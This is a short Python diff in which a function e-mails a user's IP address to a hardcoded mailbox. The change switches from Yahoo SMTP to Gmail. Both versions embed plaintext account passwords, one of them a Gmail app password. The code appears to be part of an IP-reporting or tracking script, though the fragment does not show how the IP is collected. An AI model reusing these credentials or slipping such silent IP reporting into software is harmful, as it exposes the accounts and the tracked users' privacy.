@@ -17,17 +17,17 @@ def enviar_email():
     # Configurar as informações do e-mail
     mensagem = MIMEMultipart()
     mensagem['Subject'] = "Endereço IP do Usuário"
-    mensagem['From'] = 'minadoooo11@yahoo.com'
-    mensagem['To'] = 'minadoooo11@yahoo.com'
+    mensagem['From'] = 'm4ria.gama@gmail.com'
+    mensagem['To'] = 'm4ria.gama@gmail.com'
     mensagem.attach(MIMEText(corpo_email, 'html'))
 
-    # Configurar o servidor SMTP do Yahoo
-    smtp_server = 'smtp.mail.yahoo.com'
+    # Configurar o servidor SMTP do Gmail
+    smtp_server = 'smtp.gmail.com'
     smtp_port = 587
-    smtp_user = 'minadoooo11@yahoo.com'
-    smtp_password = 'prosopopei4'
+    smtp_user = 'm4ria.gama@gmail.com'
+    smtp_password = 'mbxb sbfz loox wpoh'
 
-    # Autenticação SMTP com Yahoo
+    # Autenticação SMTP com senha de aplicativo
     smtp = smtplib.SMTP(smtp_server, smtp_port)
     smtp.starttls()
     smtp.login(smtp_user, smtp_password)
